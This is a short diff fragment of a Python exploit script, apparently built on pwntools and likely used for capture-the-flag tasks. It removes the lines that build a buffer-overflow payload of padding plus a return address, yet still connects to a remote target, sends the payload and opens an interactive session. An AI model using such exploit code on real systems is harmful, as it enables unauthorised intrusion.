@@ -33,10 +33,6 @@ def binary_exploit(binary_name, input_addr, exploit_data, binary_data):
 				break
 
 		r = remote(ip,port)
-				
-		payload = ''
-		payload += 'A'*i
-		payload += return_addr
 
 		r.sendline(payload)
 		r.interactive()
